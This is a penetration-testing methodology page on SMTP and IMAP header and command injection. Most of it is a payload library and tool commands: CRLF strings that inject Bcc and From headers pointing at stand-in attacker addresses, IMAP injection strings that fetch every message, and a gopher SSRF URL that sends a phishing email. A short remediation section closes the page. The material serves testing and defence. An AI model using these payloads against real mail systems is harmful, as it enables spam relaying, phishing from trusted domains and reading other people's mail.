---
title: "IMAP/SMTP Header Injection"
date: 2026-02-24
draft: false
---

# IMAP/SMTP Header Injection

> **Severity**: Medium–High | **CWE**: CWE-93, CWE-20
> **OWASP**: A03:2021 – Injection

---

## What Is Mail Injection?

Mail injection occurs when user-controlled data is inserted into email headers (To, CC, BCC, Subject, From) or SMTP commands without sanitization. A CRLF sequence (`\r\n`) in an email header terminates the current header and injects new headers — allowing attackers to:

- **Add BCC recipients** — send to arbitrary addresses (spam amplification)
- **Inject additional To/CC** — mass mailing abuse
- **Override From** — phishing from trusted domain
- **Inject SMTP commands** — in raw SMTP injection scenarios
- **Add arbitrary headers** — X-Mailer manipulation, content injection

**IMAP injection** targets IMAP protocol commands when user input is interpolated into IMAP queries (less common, covered in Phase 2).

```
Vulnerable PHP mail():
  mail($to, $subject, $body, "From: " . $userInput);

Injected From:
  admin@corp.com\r\nBcc: spam@attacker.com\r\nX-Extra: injected

Result:
  From: admin@corp.com
  Bcc: spam@attacker.com    ← injected — sends copy to attacker
  X-Extra: injected
```

---

## Discovery Checklist

**Phase 1 — SMTP Header Injection**
- [ ] Find "Contact Us", "Send Invoice", "Share Link", "Invite User", password reset, notification subscription forms
- [ ] Test `Name` and `Email` fields — both end up in email headers
- [ ] Inject `\r\n` (CRLF) in name field: `Test\r\nBcc: attacker@evil.com`
- [ ] Inject `\n` (LF only) in email field
- [ ] Test Subject field — can you inject additional headers via subject?
- [ ] Test "From Name" / "Reply-To" fields
- [ ] Check if confirmation emails sent to addresses you provide → confirm injection works

**Phase 2 — IMAP Injection**
- [ ] Find webmail interfaces (Roundcube, Horde, SquirrelMail) with user-controlled IMAP queries
- [ ] Test search fields for IMAP command injection
- [ ] Test mailbox name fields
- [ ] Look for IMAP literal bypass patterns

**Phase 3 — Impact**
- [ ] Confirm: send email to your own address → check headers for injection success
- [ ] Test Bcc amplification (use your controlled email as target)
- [ ] Test phishing via From override
- [ ] Test SSRF via mail() with SMTP injection

---

## Payload Library

### Payload 1 — SMTP Header Injection via CRLF

```
# Basic test — inject Bcc header (CRLF variants):
# Inject in "name" or "from name" field:

test\r\nBcc: attacker@evil.com
test%0d%0aBcc: attacker@evil.com
test%0aBcc: attacker@evil.com
test\nBcc: attacker@evil.com

# In email field:
victim@corp.com\r\nBcc: attacker@evil.com
victim%40corp.com%0d%0aBcc:%20attacker%40evil.com

# Multiple injected headers:
test\r\nBcc: attacker@evil.com\r\nCc: second@evil.com\r\nX-Test: injected

# Override From:
user\r\nFrom: ceo@target.com\r\nReply-To: phishing@attacker.com

# Add recipients to To:
user\r\nTo: victim1@corp.com, victim2@corp.com, victim3@corp.com
```

### Payload 2 — Subject Injection

```
# Subject field injection:
# Normal: Subject: Password Reset Request
# Injected subject:

Reset\r\nBcc: attacker@evil.com
Reset%0d%0aBcc: attacker@evil.com

# Override MIME type in body:
Reset\r\nContent-Type: text/html\r\n\r\n<h1>Phishing Content Here</h1>

# Inject X-Mailer for reputation bypass:
Reset\r\nX-Mailer: Microsoft Outlook 16.0
```

### Payload 3 — PHP `mail()` Function Injection

```php
// Vulnerable PHP code patterns:

// Pattern 1: User controls $from (additional headers):
mail($to, $subject, $body, "From: " . $_POST['email']);
// Inject: $_POST['email'] = "valid@mail.com\r\nBcc: spam@evil.com"

// Pattern 2: User controls $to:
mail($_POST['email'], "Welcome", $body, "From: noreply@target.com");
// Inject: "victim@corp.com\ncc:spam@evil.com"

// Pattern 3: User controls $subject:
mail($to, $_POST['subject'], $body, $headers);
// Inject: "Subject\r\nBcc: attacker@evil.com"

// PHP mail() header injection via email parameter:
// Test in Burp:
email=test@test.com%0d%0aBcc%3a+attacker%40evil.com
email=test@test.com%0ABcc%3A+attacker%40evil.com

// Comprehensive injection payload:
email=test%40test.com%0d%0aContent-Type%3a+text/html%0d%0a%0d%0a<h1>Phishing</h1>%0d%0a
```

### Payload 4 — IMAP Command Injection

```
# IMAP injection via webmail search/folder operations:
# If app constructs: UID SEARCH SUBJECT "USER_INPUT"

# IMAP SEARCH injection — terminate and inject new command:
test" UID SEARCH ALL
test" FETCH 1:* (BODY[])
test" LIST "" "*"

# IMAP LOGIN command injection (if credentials passed to IMAP):
username = admin" LOGIN admin password
# IMAP cmd becomes: LOGIN "admin" LOGIN admin password" password

# IMAP EXAMINE/SELECT injection:
# If mailbox name is user-controlled: SELECT "MAILBOX_NAME"
INBOX" EXAMINE "Sent
INBOX" LIST "" "*
INBOX"\r\nA FETCH 1:* (BODY[])

# IMAP SEARCH with literal bypass:
# {N} notation in IMAP means "literal of N bytes follows"
{6}\r\nSEARCH

# IMAP logout injection:
inbox" LOGOUT A NOOP
```

### Payload 5 — SMTP Command Injection (Direct SMTP Access)

```bash
# If app exposes direct SMTP interface or has SSRF to internal SMTP:

# Normal SMTP flow:
EHLO sender.com
MAIL FROM: <sender@sender.com>
RCPT TO: <victim@corp.com>
DATA
Subject: Test
...
.
QUIT

# SMTP injection via RCPT TO parameter:
# If app does: "RCPT TO: <" + userEmail + ">"
# Inject: victim@corp.com>\nRCPT TO: <attacker@evil.com
# Result: two RCPT TO commands → email sent to both

# SMTP injection via MAIL FROM:
# Inject headers that SMTP server accepts:
attacker@evil.com\r\nRCPT TO: <admin@target.com>

# Via gopher protocol (SSRF + SMTP injection — see 16_SSRF.md):
gopher://SMTP_SERVER:25/_%0d%0aEHLO+localhost%0d%0aMAIL+FROM%3A%3Cadmin%40target.com%3E%0d%0aRCPT+TO%3A%3Cvictim%40victim.com%3E%0d%0aDATA%0d%0aSubject%3A+Phishing%0d%0a%0d%0aClick+here+to+steal+your+password%0d%0a.%0d%0aQUIT
```

### Payload 6 — NodeMailer / Python smtplib Injection

```javascript
// Node.js nodemailer — if user input in "to" or "from" fields:
// Not directly injectable in modern versions — but test anyway

// Python smtplib injection test:
python3 -c "
import smtplib
from email.mime.text import MIMEText

# Injected header via name field:
to_addr = 'victim@corp.com'
from_addr = 'sender@target.com'

# Craft message with injected headers:
msg = MIMEText('Test body')
msg['From'] = 'Sender <sender@target.com>'
msg['To'] = to_addr
msg['Subject'] = 'Test\r\nBcc: attacker@evil.com'  # injection in subject

with smtplib.SMTP('localhost', 25) as s:
    s.sendmail(from_addr, [to_addr], msg.as_string())
print('Sent')
"
```

---

## Tools

```bash
# Manual injection test — send to your controlled email and check headers:
curl -X POST https://target.com/contact \
  -d "name=Test%0d%0aBcc:%20attacker@evil.com&email=test@test.com&message=test"

# Check received email headers for injection confirmation:
# Look for added Bcc, Cc, X- headers in raw message source

# swaks — Swiss Army Knife for SMTP testing:
swaks --to victim@corp.com \
      --from 'attacker@evil.com' \
      --server target.com:25 \
      --header "Subject: Test\r\nBcc: bcc@evil.com"

# SMTP injection test with netcat:
nc -v target.com 25
EHLO test.com
MAIL FROM: <test@test.com>
RCPT TO: <victim@target.com>$'\r\n'RCPT TO: <attacker@evil.com>
DATA
Subject: Header Injection Test

Test body
.
QUIT

# Burp Suite:
# Intruder — inject CRLF payloads in all mail-related parameters
# Payload list: \r\n, %0d%0a, %0a, \n, etc.

# Test IMAP injection with nc:
nc target.com 143
A001 LOGIN "admin" "password"
A002 SELECT "INBOX"
A003 SEARCH SUBJECT "test" BODY "INJECT HERE"
A004 LOGOUT

# Python IMAP injection test:
python3 -c "
import imaplib
mail = imaplib.IMAP4('target.com')
mail.login('user', 'pass')
# Test injection in search:
mail.uid('SEARCH', None, 'SUBJECT', '\"test\" FETCH 1:* (BODY[])')
"
```

---

## Remediation Reference

- **Validate email addresses**: use RFC 5322 compliant email validator — reject any input containing `\r`, `\n`, `%0d`, `%0a`
- **Strip CRLF from all mail header inputs**: remove `\r`, `\n` and their encoded forms before inserting into headers
- **Use email libraries correctly**: modern libraries like PHPMailer, SwiftMailer, Symfony Mailer have built-in header injection protection when used via their API (not raw headers)
- **PHP `mail()` — avoid entirely**: use PHPMailer, Symfony Mailer, or other dedicated library instead
- **IMAP**: use parameterized IMAP searches — never concatenate user input into IMAP command strings
- **Input allowlisting**: email fields should only contain valid email format; name fields alphanumeric + limited punctuation

*Part of the Web Application Penetration Testing Methodology series.*
